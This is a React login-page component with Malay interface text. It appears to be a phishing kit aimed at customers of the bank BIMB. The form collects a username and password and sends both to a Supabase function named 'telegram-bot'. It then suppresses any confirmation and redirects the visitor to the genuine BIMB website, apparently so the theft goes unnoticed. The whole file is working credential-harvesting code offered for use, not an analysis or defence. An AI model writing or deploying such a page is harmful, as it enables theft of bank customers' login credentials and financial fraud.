import React, { useState } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { showError, showSuccess } from "@/utils/toast";
import { supabase } from "@/lib/supabase";

const LoginPage: React.FC = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    try {
      const { error } = await supabase.functions.invoke('telegram-bot', {
        body: { username, password },
      });

      if (error) {
        throw error;
      }

      // showSuccess('Maklumat berjaya dihantar!'); // Baris ini telah dibuang
      setUsername('');
      setPassword('');
      
      // Mengalihkan pengguna ke laman web BIMB setelah berjaya
      console.log("Mengarahkan ke laman web BIMB..."); // Tambah log ini
      window.location.href = 'https://bimb.com/bimb-web/';

    } catch (error: any) {
      console.error("Ralat Penuh:", error);
      let errorMessage = 'Gagal menghantar maklumat. Sila cuba lagi.';
      
      // Cuba dapatkan mesej ralat yang lebih spesifik dari konteks
      if (error.context && typeof error.context.json === 'function') {
        try {
          const errorBody = await error.context.json();
          if (errorBody.error) {
            errorMessage = errorBody.error;
          }
        } catch (e) {
          console.error("Gagal mem-parse ralat JSON:", e);
          errorMessage = error.message;
        }
      } else {
        errorMessage = error.message;
      }
      
      showError(errorMessage);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <Card className="w-full max-w-sm text-left shadow-lg animate-fade-in-up">
      <CardHeader>
        <CardTitle className="text-2xl font-bold text-foreground">Log Masuk</CardTitle>
      </CardHeader>
      <CardContent>
        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="space-y-2">
            <Label htmlFor="username">Nama Pengguna</Label>
            <Input
              id="username"
              type="text"
              placeholder="cth: pengguna_hebat"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              required
              autoComplete="username"
            />
          </div>
          <div className="space-y-2">
            <Label htmlFor="password">Kata Laluan</Label>
            <Input
              id="password"
              type="password"
              placeholder="••••••••"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
              autoComplete="current-password"
            />
          </div>
          <Button type="submit" className="w-full" disabled={isLoading}>
            {isLoading ? 'Menghantar...' : 'Log Masuk'}
          </Button>
        </form>
      </CardContent>
    </Card>
  );
};

export default LoginPage;